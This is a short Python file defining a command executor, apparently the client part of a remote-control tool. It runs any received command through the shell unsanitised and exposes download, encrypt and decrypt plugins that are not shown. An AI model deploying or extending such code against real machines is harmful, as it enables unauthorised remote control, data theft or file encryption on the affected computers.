import os
import subprocess

from ..plugins.client_commander_plugins import *


####################################################################################################

class Commander:
	def __init__(self):
		self.builtins = {
			'cd': self.change_directory,
			'download': download,
			'decrypt': decrypt,
			'encrypt': encrypt,
			'quit': self.quit,
		}

	def run(self, command_dict:dict) -> dict:
		if command_dict:
			keyword = command_dict["keyword"]
			if keyword in self.builtins:
				output = self.builtins[keyword](command_dict)
			else:
				args = command_dict["args"] if command_dict['args'] else []
				output = subprocess.getoutput(f"{keyword} {' '.join(args)}")
			return output

	def current_directory(self) -> str:
		return os.getcwd()

	def change_directory(self, command_dict:dict) -> str:
		try:
			if not command_dict["args"] or command_dict["args"][0] == '~':
				os.chdir(os.path.expanduser("~"))
			else:
				os.chdir(' '.join(command_dict["args"]))
		except FileNotFoundError as e:
		# if there is an error, set as the output
			output = str(e)
		else:
			output = ""
		return output

	def quit(self, command):
		exit()